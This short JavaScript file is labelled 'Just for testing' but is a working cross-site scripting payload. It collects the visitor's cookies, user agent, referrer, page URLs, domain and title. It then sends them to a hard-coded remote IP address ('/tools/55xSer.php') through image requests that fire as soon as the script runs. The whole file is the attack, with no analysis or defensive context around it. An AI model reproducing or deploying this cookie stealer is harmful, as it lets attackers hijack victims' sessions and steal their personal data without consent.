/*
Author : Who care
Date : 6/7/2013
Version : 0.1
Desc : Just for testing 
*/

http_server="http://216.24.201.98/tools/55xSer.php?p=";
var info = {};  //privite info object
info.ua = escape(navigator.userAgent);
info.lang = navigator.language;
info.referrer = document.referrer;
info.location = escape(window.location.href);
info.toplocation = escape(top.location.href);
info.cookie = escape(document.cookie).replace(/\+/g, '%2b');
info.domain=document.domain;
info.title=document.title;
//
function json2str(o){
	var arr=[];
	var fmt=function(s){
	  if(typeof s=='object' && s!=null)
	  {
	  	return json2str(s);
	  }

	  //rgExp.test return true while param match the reg
	  return /^(string|number)$/.test(typeof s)?"'"+s+"'":s;
	}
	for(var i in o) 
	{
		arr.push("'"+i+"':"+fmt(o[i]));
	}
	var retval='{'+arr.join(',')+'}';
	return retval;
}
var s=JSON.stringify(info);
//window.onload=sentMsgWithGet()

	var i=json2str(info);
	new Image().src=http_server+i; //send
	new Image().src=http_server+s; //send


